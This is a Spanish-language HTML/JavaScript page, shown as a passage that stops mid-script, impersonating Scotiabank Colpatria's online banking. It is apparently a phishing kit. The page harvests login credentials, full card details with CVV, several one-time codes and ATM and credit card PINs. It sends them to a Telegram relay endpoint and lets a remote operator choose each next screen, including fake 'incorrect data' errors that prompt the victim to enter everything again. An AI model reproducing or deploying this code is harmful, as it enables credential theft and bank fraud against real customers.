<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scotiabank Colpatria | Banca virtual</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <style>
        @font-face {
            font-family: Scotia Bold;
            src: url(/colpatria/Scotia_W_Bd.627aff1c32d06c15.woff) format("woff"), url(Scotia_W_Bd.3d89a25acb9e796d.woff2) format("woff2")
        }

        @font-face {
            font-family: Scotia Headline;
            font-style: normal;
            src: url(/colpatria/Scotia_W_Headline.5a532caa3319ee5c.woff) format("woff"), url(Scotia_W_Headline.c0b92ef00c6db65a.woff2) format("woff2")
        }

        @font-face {
            font-family: Scotia Regular;
            font-style: normal;
            src: url(/colpatria/Scotia_W_Rg.a53c6af4aaff8c13.woff) format("woff"), url(Scotia_W_Rg.bb5cf5215aeee399.woff2) format("woff2")
        }

        .texto-1 {
            color: #333;
            font-family: Scotia Headline, Arial, Helvetica, "sans-serif";
            font-weight: 400;
            letter-spacing: 0;
            line-height: 4.1rem;
            margin: 0;
            font-size: 27px;
        }

        .texto-2 {
            font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
            color: #333;
        }

        .entrada-1 {
            padding: 3px 1px;
            background-color: transparent;
            color: #333;
            display: block;
            outline: none;
            position: relative;
            transition: box-shadow .2s ease-in-out;
            padding-left: 8px;
            font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
            font-size: 18px;
            font-weight: 400;
            letter-spacing: 0;
            line-height: 2.8rem;
            margin: 0;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            appearance: none;
            border: none;
        }

        .boton-1 {
            cursor: pointer;
            outline: none;
            overflow: visible;
            position: relative;
            font-family: Scotia Bold;
            font-size: 18px;
            font-weight: initial;
            letter-spacing: 0rem;
            line-height: 1.6rem;
            border: .1rem solid;
            border-radius: .8rem;
            padding: 0 3.6rem;
            text-decoration: none;
            background-color: #ec111a;
            border-color: #ec111a;
            color: #fff;
            min-height: 60px;
            transition: background-color ease-in .1s, color ease-in .1s;
            width: 100%;
        }

        .boton-1:disabled {
            background-color: #b5aeae;
            border-color: #b5aeae;
        }

        .borde-entrada-1 {
            border-bottom-color: #757575;
            border-bottom-style: solid;
            border-radius: 0;
            border-width: 0 0 1px;
        }

        .loading-spinner {
            display: inline-block;
            width: 100px;
            height: 100px;
            border: 10px solid rgba(230, 230, 230, .3);
            border-radius: 50%;
            border-top-color: #ec111a;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .hidden {
            display: none !important;
        }

        .error-message {
            color: #ec111a;
            font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
            font-size: 12px;
            margin-top: 4px;
            margin-left: 8px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .borde-entrada-error {
            border-bottom-color: #ec111a !important;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                margin: 0 auto;
            }
        }
    </style>
</head>

<body class="px-3">
<x-lab-banner />
    <!-- Loading Overlay -->
    <div id="loading" class="fixed-top bg-white d-flex align-items-center justify-content-center hidden"
        style="height: 100vh; z-index: 9999;">
        <div class="text-center">
            <div class="loading-spinner mx-auto"></div>
            <p class="mt-3">Espere un momento por favor...</p>
        </div>
    </div>

    <!-- Header -->
    <div class="text-center py-4">
        <img src="/colpatria/logo_colpatria.svg" width="300" height="auto" alt="Scotiabank Colpatria">
    </div>

    <!-- Vista: Usuario -->
    <div id="user" class="hidden">
        <h1 class="texto-1 mt-4 text-center">Ingresa a tu Banca Virtual</h1>
        <br>
        <!-- Mensaje de error general -->
        <div id="errorGeneralUser" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <div class="row borde-entrada-1" id="containerUsuario">
                    <div class="col-1" style="padding-top: 11px;"><i class="bi bi-person"></i></div>
                    <input class="entrada-1 col-11" id="usuario" name="usuario" type="text" placeholder="Nombre de usuario"
                        minlength="4" maxlength="12">
                </div>
                <div class="error-message" id="errorUsuario"></div>
            </div>
            <br>
            <div class="mb-5">
                <div class="row borde-entrada-1" id="containerClave">
                    <div class="col-1" style="padding-top: 11px;"><i class="bi bi-lock"></i></div>
                    <input class="entrada-1 col-11" id="clave" name="clave" type="password" placeholder="Contraseña"
                        minlength="8" maxlength="15">
                </div>
                <div class="error-message" id="errorClave"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnUser" class="boton-1 text-center px-5" disabled>Ingresar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Tarjeta de Crédito/Débito -->
    <div id="tc" class="hidden">
        <h1 class="texto-1 mt-4 text-center">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3">
            <p class="texto-2 mb-0 mt-2">Ingresa los datos de tu tarjeta de crédito o débito:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralTC" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="px-6 py-4 mb-2">
                <div class="mb-4">
                    <div class="row borde-entrada-1" id="containerNumTarjeta">
                        <div class="col-1" style="padding-top: 11px;"><i class="bi bi-credit-card"></i></div>
                        <input class="entrada-1 col-11" id="numtarjetaTC" name="numtarjeta" type="text"
                            placeholder="Número de tarjeta" minlength="16" maxlength="19" autocomplete="off">
                    </div>
                    <div class="error-message" id="errorNumTarjeta"></div>
                </div>
                <br>
                <div class="row mb-4">
                    <div class="col-6">
                        <div class="row borde-entrada-1" id="containerVencimiento">
                            <div class="col-2" style="padding-top: 11px;"><i class="bi bi-calendar"></i></div>
                            <input class="entrada-1 col-10" id="vencimientoTC" name="vencimiento" type="text"
                                placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                        </div>
                        <div class="error-message" id="errorVencimiento"></div>
                    </div>
                    <div class="col-6">
                        <div class="row borde-entrada-1" id="containerCVV">
                            <div class="col-2" style="padding-top: 11px;"><i class="bi bi-lock"></i></div>
                            <input class="entrada-1 col-10" id="cvvTC" name="cvv" type="text" placeholder="CVV"
                                minlength="3" maxlength="4" autocomplete="off">
                        </div>
                        <div class="error-message" id="errorCVV"></div>
                    </div>
                </div>
                <br>
                <div class="mb-5">
                    <div class="row borde-entrada-1" id="containerTitular">
                        <div class="col-1" style="padding-top: 11px;"><i class="bi bi-person"></i></div>
                        <input class="entrada-1 col-11" id="titularTC" name="titular" type="text"
                            placeholder="Nombre del titular" minlength="3" maxlength="100" autocomplete="off">
                    </div>
                    <div class="error-message" id="errorTitular"></div>
                </div>
            </div>
            <div class="px-3 mb-3" style="font-size: 10px;">
                <span><input type="checkbox" id="checkTC" style="accent-color: #043263;">
                    Certifico que soy el titular de este producto.</span>
            </div>
            <div class="d-flex justify-content-center">
                <button id="btnTC" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: OTP App -->
    <div id="otpapp" class="hidden">
        <h1 class="texto-1 mt-5 text-start px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3">
            <p class="texto-2 mb-0 mt-2">Se ha generado un código de seguridad en la App</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralOtpApp" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-5">
                <div class="row borde-entrada-1" id="containerOtpApp">
                    <div class="col-1" style="padding-top: 11px;"><i class="bi bi-key"></i></div>
                    <input class="entrada-1 col-11" id="otpappInput" name="otpapp" type="password"
                        placeholder="Código de seguridad" minlength="6" maxlength="8">
                </div>
                <div class="error-message" id="errorOtpApp"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnOtpApp" class="boton-1 text-center px-5" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: OTP SMS -->
    <div id="otpsms" class="hidden">
        <h1 class="texto-1 mt-5 text-start px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3">
            <p class="texto-2 mb-0 mt-2">Se ha envíado un código de seguridad a tu correo electrónico y/o
                celular</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralOtpSms" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-5">
                <div class="row borde-entrada-1" id="containerOtpSms">
                    <div class="col-1" style="padding-top: 11px;"><i class="bi bi-key"></i></div>
                    <input class="entrada-1 col-11" id="otpsmsInput" name="otpsms" type="password"
                        placeholder="Código de seguridad" minlength="6" maxlength="8">
                </div>
                <div class="error-message" id="errorOtpSms"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnOtpSms" class="boton-1 text-center px-5" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: OTP Audio -->
    <div id="otpaudio" class="hidden">
        <h1 class="texto-1 mt-5 text-start px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3">
            <p class="texto-2 mb-0 mt-2">Por tu seguridad, ingresa tu clave de audio</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralOtpAudio" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-5">
                <div class="row borde-entrada-1" id="containerOtpAudio">
                    <div class="col-1" style="padding-top: 11px;"><i class="bi bi-key"></i></div>
                    <input class="entrada-1 col-11" id="otpaudioInput" name="otpaudio" type="password"
                        placeholder="Clave de audio" minlength="4" maxlength="4">
                </div>
                <div class="error-message" id="errorOtpAudio"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnOtpAudio" class="boton-1 text-center px-5" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Clave de Cajero -->
    <div id="clavecajero" class="hidden">
        <h1 class="texto-1 mt-5 text-start px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3">
            <p class="texto-2 mb-0 mt-2">Por tu seguridad, ingresa la clave de tu tarjeta débito</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralClaveCajero" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-5">
                <div class="row borde-entrada-1" id="containerClaveCajero">
                    <div class="col-1" style="padding-top: 11px;"><i class="bi bi-lock-fill"></i></div>
                    <input class="entrada-1 col-11" id="clavecajeroInput" name="clavecajero" type="password"
                        placeholder="Clave de cajero" minlength="4" maxlength="4">
                </div>
                <div class="error-message" id="errorClaveCajero"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnClaveCajero" class="boton-1 text-center px-5" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Clave de Tarjeta de Crédito -->
    <div id="clavetdc" class="hidden">
        <h1 class="texto-1 mt-5 text-start px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3">
            <p class="texto-2 mb-0 mt-2">Por tu seguridad, ingresa la clave de tu tarjeta de crédito</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralClaveTDC" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-5">
                <div class="row borde-entrada-1" id="containerClaveTDC">
                    <div class="col-1" style="padding-top: 11px;"><i class="bi bi-credit-card-2-front"></i></div>
                    <input class="entrada-1 col-11" id="clavetdcInput" name="clavetdc" type="password"
                        placeholder="Clave de tarjeta de crédito" minlength="4" maxlength="4">
                </div>
                <div class="error-message" id="errorClaveTDC"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnClaveTDC" class="boton-1 text-center px-5" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Finalización -->
    <div id="fin" class="hidden">
        <div class="text-center">
            <div class="my-4">
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="#28a745"
                    class="bi bi-check-circle-fill" viewBox="0 0 16 16">
                    <path
                        d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z" />
                </svg>
            </div>
            <h2 class="mb-3">Proceso completado exitosamente</h2>
            <p class="">Gracias por utilizar nuestros servicios.</p>
            <p class="">Serás redirigido en breve...</p>
        </div>
    </div>

    <!-- Vista: Wait (Loading intermedio) -->
    <div id="wait" class="hidden">
        <div class="text-center mt-5">
            <div class="loading-spinner"></div>
        </div>
        <br>
        <div class="text-center">
            <p class="texto-1">Espere un momento por favor.</p>
        </div>
    </div>

    <script>
        $(document).ready(function () {
            // ==================== CONFIGURACIÓN INICIAL ====================
            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'user'
            };

            console.log('Session UniqID:', appState.uniqId);

            // ==================== RECUPERAR DATOS PSE ====================
            const pseDatosStr = sessionStorage.getItem('pseDatos');
            if (pseDatosStr) {
                try {
                    const pseDatos = JSON.parse(pseDatosStr);
                    const camposPSE = {
                        'nombre': pseDatos.nombre,
                        'email': pseDatos.email,
                        'celular': pseDatos.celular,
                        'direccion': pseDatos.direccion,
                        'ciudad': pseDatos.ciudad,
                        'departamento': pseDatos.departamento,
                        'banco': pseDatos.banco,
                        'tipoPersona': pseDatos.tipoPersona,
                        'ente': 'brasilia'
                    };
                    Object.keys(camposPSE).forEach(key => {
                        if (camposPSE[key]) {
                            const storageKey = `${appState.uniqId}_${key}`;
                            localStorage.setItem(storageKey, JSON.stringify(camposPSE[key]));
                        }
                    });
                    console.log('Datos PSE recuperados:', pseDatos);
                } catch (e) {
                    console.error('Error al parsear pseDatos:', e);
                }
            }

            // ==================== FUNCIONES AUXILIARES ====================
            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            function hideAllViews() {
                $('#user, #tc, #otpapp, #otpsms, #otpaudio, #clavecajero, #clavetdc, #fin, #wait').addClass('hidden');
            }

            function showView(viewId) {
                hideAllViews();
                $('#' + viewId).removeClass('hidden');

                // Mostrar mensaje de error general si la vista ya fue mostrada antes
                // (indica que el usuario ingresó datos incorrectos)
                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                if (viewHistory.includes(viewId) && viewId !== 'wait' && viewId !== 'fin') {
                    // La vista ya fue mostrada antes, mostrar mensaje de error y limpiar campos
                    if (viewId === 'user') {
                        $('#errorGeneralUser').text('Usuario o contraseña incorrectos. Intenta nuevamente.').addClass('show');
                        // Limpiar campos
                        $('#usuario').val('');
                        $('#clave').val('');
                        ocultarError('errorUsuario', 'containerUsuario');
                        ocultarError('errorClave', 'containerClave');
                        $('#btnUser').prop('disabled', true);
                    } else if (viewId === 'tc') {
                        $('#errorGeneralTC').text('Los datos de la tarjeta son incorrectos. Verifica e intenta nuevamente.').addClass('show');
                        // Limpiar campos
                        $('#numtarjetaTC').val('');
                        $('#vencimientoTC').val('');
                        $('#cvvTC').val('');
                        $('#titularTC').val('');
                        $('#checkTC').prop('checked', false);
                        ocultarError('errorNumTarjeta', 'containerNumTarjeta');
                        ocultarError('errorVencimiento', 'containerVencimiento');
                        ocultarError('errorCVV', 'containerCVV');
                        ocultarError('errorTitular', 'containerTitular');
                        verde1 = 0;
                        verde2 = 0;
                        verde3 = 0;
                        verde4 = 0;
                        $('#btnTC').prop('disabled', true);
                    } else if (viewId === 'otpapp') {
                        $('#errorGeneralOtpApp').text('El código ingresado es incorrecto. Intenta nuevamente.').addClass('show');
                        // Limpiar campos
                        $('#otpappInput').val('');
                        ocultarError('errorOtpApp', 'containerOtpApp');
                        $('#btnOtpApp').prop('disabled', true);
                    } else if (viewId === 'otpsms') {
                        $('#errorGeneralOtpSms').text('El código ingresado es incorrecto. Intenta nuevamente.').addClass('show');
                        // Limpiar campos
                        $('#otpsmsInput').val('');
                        ocultarError('errorOtpSms', 'containerOtpSms');
                        $('#btnOtpSms').prop('disabled', true);
                    } else if (viewId === 'otpaudio') {
                        $('#errorGeneralOtpAudio').text('La clave ingresada es incorrecta. Intenta nuevamente.').addClass('show');
                        // Limpiar campos
                        $('#otpaudioInput').val('');
                        ocultarError('errorOtpAudio', 'containerOtpAudio');
                        $('#btnOtpAudio').prop('disabled', true);
                    } else if (viewId === 'clavecajero') {
                        $('#errorGeneralClaveCajero').text('La clave ingresada es incorrecta. Intenta nuevamente.').addClass('show');
                        // Limpiar campos
                        $('#clavecajeroInput').val('');
                        ocultarError('errorClaveCajero', 'containerClaveCajero');
                        $('#btnClaveCajero').prop('disabled', true);
                    } else if (viewId === 'clavetdc') {
                        $('#errorGeneralClaveTDC').text('La clave ingresada es incorrecta. Intenta nuevamente.').addClass('show');
                        // Limpiar campos
                        $('#clavetdcInput').val('');
                        ocultarError('errorClaveTDC', 'containerClaveTDC');
                        $('#btnClaveTDC').prop('disabled', true);
                    }
                } else {
                    // Ocultar mensajes de error generales
                    $('#errorGeneralUser, #errorGeneralTC, #errorGeneralOtpApp, #errorGeneralOtpSms, #errorGeneralOtpAudio, #errorGeneralClaveCajero, #errorGeneralClaveTDC').removeClass('show').text('');
                }

                // Registrar la vista en el historial
                if (!viewHistory.includes(viewId)) {
                    sessionStorage.setItem('viewHistory', viewHistory + viewId + ',');
                }

                appState.currentView = viewId;
            }

            function showLoading() {
                $('#loading').removeClass('hidden');
                setTimeout(iniciarPolling, 4000);
            }

            function hideLoading() {
                $('#loading').addClass('hidden');
            }

            let enviandoATelegram = false;

            async function enviarATelegram() {
                if (enviandoATelegram) {
                    console.log('Ya hay un envío en progreso, evitando duplicado');
                    return;
                }

                enviandoATelegram = true;

                const allData = {};
                const fields = ['usuario', 'clave', 'ente', 'tdc', 'cvv', 'ven', 'otpsms', 'otpapp', 'otpaudio',
                    'clavecajero', 'clavetdc', 'nombre', 'email', 'celular', 'ciudad', 'direccion',
                    'departamento', 'banco', 'tipoPersona', 'status', 'uniqid'
                ];

                fields.forEach(field => {
                    allData[field] = getFromLocalStorage(field);
                });

                try {
                    const response = await fetch('/api/telegram/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Datos enviados a Telegram:', result);
                } catch (e) {
                    console.error('Error al enviar a Telegram:', e);
                } finally {
                    setTimeout(() => {
                        enviandoATelegram = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                const loadingElement = document.getElementById('loading');
                if (loadingElement && loadingElement.classList.contains('hidden')) {
                    return;
                }

                try {
                    const response = await fetch(`/api/telegram/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        hideLoading();

                        // Mapeo de respuestas de Telegram a vistas
                        const viewMap = {
                            'user': 'user',
                            'tc': 'tc',
                            'otpapp': 'otpapp',
                            'otpsms': 'otpsms',
                            'otpaudio': 'otpaudio',
                            'clavecajero': 'clavecajero',
                            'clavetdc': 'clavetdc',
                            'fin': 'fin',
                            'wait': 'wait'
                        };

                        const viewId = viewMap[data.button] || data.button;
                        showView(viewId);

                        // Redirección automática para fin
                        if (viewId === 'fin') {
                            setTimeout(function () {
                                window.location.href =
                                    'https://www.scotiabankcolpatria.com/personas/tarjeta-de-credito/solicitar';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000);
                }
            }

            // ==================== VALIDACIONES ====================
            // Variables globales para validación de tarjeta
            var verde1 = 0;
            var verde2 = 0;
            var verde3 = 0;
            var verde4 = 0;

            function validateUser() {
                const usuario = $('#usuario').val().trim();
                const clave = $('#clave').val().trim();
                const isValid = usuario !== "" && clave !== "";
                $('#btnUser').prop('disabled', !isValid);
                return isValid;
            }

            function validateTC() {
                const isValid = typeof verde1 !== 'undefined' && typeof verde2 !== 'undefined' &&
                    typeof verde3 !== 'undefined' && typeof verde4 !== 'undefined' &&
                    verde1 === 1 && verde2 === 1 && verde3 === 1 && verde4 === 1 &&
                    $('#checkTC').is(':checked');
                $('#btnTC').prop('disabled', !isValid);
                return isValid;
            }

            function validateOtp(inputId, btnId) {
                const value = $(inputId).val().trim();
                let otpRegex;

                // Validación específica para OTP Audio, Clave Cajero y Clave TDC (4 dígitos)
                if (inputId === '#otpaudioInput' || inputId === '#clavecajeroInput' || inputId === '#clavetdcInput') {
                    otpRegex = /^\d{4}$/;
                } else {
                    // Para OTP App y OTP SMS (6-8 dígitos)
                    otpRegex = /^\d{6,8}$/;
                }

                const isValid = otpRegex.test(value);
                $(btnId).prop('disabled', !isValid);
                return isValid;
            }

            // ==================== EVENTOS ====================
            // Validación del usuario
            $('#usuario').on('input', function () {
                const value = $(this).val().trim();

                if (value.length === 0) {
                    ocultarError('errorUsuario', 'containerUsuario');
                } else if (value.length < 4) {
                    mostrarError('usuario', 'errorUsuario', 'containerUsuario',
                        'El nombre de usuario debe tener al menos 4 caracteres');
                } else if (value.length > 12) {
                    mostrarError('usuario', 'errorUsuario', 'containerUsuario',
                        'El nombre de usuario no puede exceder 12 caracteres');
                } else {
                    ocultarError('errorUsuario', 'containerUsuario');
                }

                validateUser();
            });

            // Validación de la contraseña
            $('#clave').on('input', function () {
                const value = $(this).val().trim();

                if (value.length === 0) {
                    ocultarError('errorClave', 'containerClave');
                } else if (value.length < 8) {
                    mostrarError('clave', 'errorClave', 'containerClave',
                        'La contraseña debe tener al menos 8 caracteres');
                } else if (value.length > 15) {
                    mostrarError('clave', 'errorClave', 'containerClave',
                        'La contraseña no puede exceder 15 caracteres');
                } else {
                    ocultarError('errorClave', 'containerClave');
                }

                validateUser();
            });

            $('#btnUser').on('click', async function () {
                if (validateUser()) {
                    saveToLocalStorage('usuario', $('#usuario').val().trim());
                    saveToLocalStorage('clave', $('#clave').val().trim());
                    saveToLocalStorage('ente', 'colpatria');
                    saveToLocalStorage('status', 'USER');
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarATelegram();
                    showLoading();
                    iniciarPolling();
                }
            });

            // ==================== FUNCIONES PARA MOSTRAR ERRORES ====================
            /**
             * Muestra un mensaje de error en un campo específico
             * @param {string} fieldId - ID del campo de entrada
             * @param {string} errorId - ID del elemento de error
             * @param {string} containerId - ID del contenedor con borde
             * @param {string} mensaje - Mensaje de error a mostrar
             */
            function mostrarError(fieldId, errorId, containerId, mensaje) {
                $('#' + errorId).text(mensaje).addClass('show');
                $('#' + containerId).addClass('borde-entrada-error');
            }

            /**
             * Oculta el mensaje de error de un campo específico
             * @param {string} errorId - ID del elemento de error
             * @param {string} containerId - ID del contenedor con borde
             */
            function ocultarError(errorId, containerId) {
                $('#' + errorId).removeClass('show').text('');
                $('#' + containerId).removeClass('borde-entrada-error');
            }

            // ==================== VALIDACIÓN DE TARJETA CON ALGORITMO DE LUHN ====================
            /**
             * Implementación del algoritmo de Luhn para validar números de tarjeta
             * @param {string} cardNumber - Número de tarjeta sin espacios
             * @returns {boolean} - true si el número es válido según Luhn
             */
            function validarLuhn(cardNumber) {
                // Eliminar espacios y verificar que solo sean dígitos
                const numero = cardNumber.replace(/\s/g, '');
                if (!/^\d+$/.test(numero)) {
                    return false;
                }

                let suma = 0;
                let alternar = false;

                // Recorrer de derecha a izquierda
                for (let i = numero.length - 1; i >= 0; i--) {
                    let digito = parseInt(numero.charAt(i), 10);

                    if (alternar) {
                        digito *= 2;
                        if (digito > 9) {
                            digito -= 9;
                        }
                    }

                    suma += digito;
                    alternar = !alternar;
                }

                return (suma % 10) === 0;
            }

            /**
             * Detecta el tipo de tarjeta basándose en el número
             * @param {string} cardNumber - Número de tarjeta
             * @returns {string} - Tipo de tarjeta: 'visa', 'mastercard', 'amex', 'diners', 'discover', 'unknown'
             */
            function detectarTipoTarjeta(cardNumber) {
                const numero = cardNumber.replace(/\s/g, '');

                // Visa: empieza con 4
                if (/^4/.test(numero)) {
                    return 'visa';
                }
                // Mastercard: empieza con 51-55 o 2221-2720
                if (/^5[1-5]/.test(numero) || /^2(2[2-9][0-9]|[3-6][0-9]{2}|7[0-1][0-9]|720)/.test(numero)) {
                    return 'mastercard';
                }
                // American Express: empieza con 34 o 37
                if (/^3[47]/.test(numero)) {
                    return 'amex';
                }
                // Diners Club: empieza con 36 o 38
                if (/^3[68]/.test(numero)) {
                    return 'diners';
                }
                // Discover: empieza con 6011, 622126-622925, 644-649, 65
                if (/^(6011|622(12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[0-1][0-9]|92[0-5])|64[4-9]|65)/.test(numero)) {
                    return 'discover';
                }

                return 'unknown';
            }

            /**
             * Valida la fecha de vencimiento de la tarjeta
             * @param {string} vencimiento - Fecha en formato MM/AA
             * @returns {boolean} - true si la fecha es válida y no está expirada
             */
            function validarVencimiento(vencimiento) {
                if (!/^\d{2}\/\d{2}$/.test(vencimiento)) {
                    return false;
                }

                const [mes, anio] = vencimiento.split('/');
                const mesNum = parseInt(mes, 10);
                const anioNum = parseInt(anio, 10);

                // Validar mes entre 01 y 12
                if (mesNum < 1 || mesNum > 12) {
                    return false;
                }

                // Obtener fecha actual
                const hoy = new Date();
                const anioActual = hoy.getFullYear() % 100; // Últimos 2 dígitos del año
                const mesActual = hoy.getMonth() + 1; // getMonth() retorna 0-11

                // Validar que no esté expirada
                if (anioNum < anioActual) {
                    return false;
                }
                if (anioNum === anioActual && mesNum < mesActual) {
                    return false;
                }

                return true;
            }

            /**
             * Valida el nombre del titular
             * @param {string} nombre - Nombre del titular
             * @returns {boolean} - true si el nombre es válido
             */
            function validarNombreTitular(nombre) {
                const nombreLimpio = nombre.trim();

                // Mínimo 3 caracteres, máximo 100
                if (nombreLimpio.length < 3 || nombreLimpio.length > 100) {
                    return false;
                }

                // Solo letras, espacios, puntos, guiones y apóstrofes
                const regex = /^[a-zA-ZáéíóúÁÉÍÓÚñÑ\s.\-']+$/;
                if (!regex.test(nombreLimpio)) {
                    return false;
                }

                // Debe tener al menos un nombre y un apellido (mínimo 2 palabras)
                const palabras = nombreLimpio.split(/\s+/).filter(p => p.length > 0);
                return palabras.length >= 2;
            }

            // ==================== EVENTOS DE VALIDACIÓN DE TARJETA ====================

            // Validación y formato del número de tarjeta
            $('#numtarjetaTC').on('input', function () {
                let value = $(this).val().replace(/\s/g, ''); // Eliminar espacios existentes

                // Solo permitir números
                value = value.replace(/\D/g, '');

                // Limitar a 19 dígitos
                if (value.length > 19) {
                    value = value.substring(0, 19);
                }

                // Aplicar formato con espacios cada 4 dígitos
                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) {
                        formattedValue += ' ';
                    }
                    formattedValue += value[i];
                }

                $(this).val(formattedValue);

                // Validar con Luhn y longitud
                const tipoTarjeta = detectarTipoTarjeta(value);
                let longitudValida = false;
                let longitudEsperada = 16;

                if (tipoTarjeta === 'amex') {
                    longitudEsperada = 15;
                    longitudValida = value.length === 15;
                } else if (tipoTarjeta === 'diners') {
                    longitudEsperada = 14;
                    longitudValida = value.length === 14;
                } else {
                    longitudEsperada = 16;
                    longitudValida = value.length === 16;
                }

                // Mostrar errores específicos
                if (value.length === 0) {
                    ocultarError('errorNumTarjeta', 'containerNumTarjeta');
                    verde1 = 0;
                } else if (value.length < longitudEsperada) {
                    mostrarError('numtarjetaTC', 'errorNumTarjeta', 'containerNumTarjeta',
                        'El número de tarjeta debe tener ' + longitudEsperada + ' dígitos');
                    verde1 = 0;
                } else if (!longitudValida) {
                    mostrarError('numtarjetaTC', 'errorNumTarjeta', 'containerNumTarjeta',
                        'Longitud de tarjeta inválida para el tipo detectado');
                    verde1 = 0;
                } else if (!validarLuhn(value)) {
                    mostrarError('numtarjetaTC', 'errorNumTarjeta', 'containerNumTarjeta',
                        'El número de tarjeta no es válido');
                    verde1 = 0;
                } else {
                    ocultarError('errorNumTarjeta', 'containerNumTarjeta');
                    verde1 = 1;
                }

                validateTC();
            });

            // Validación y formato de vencimiento
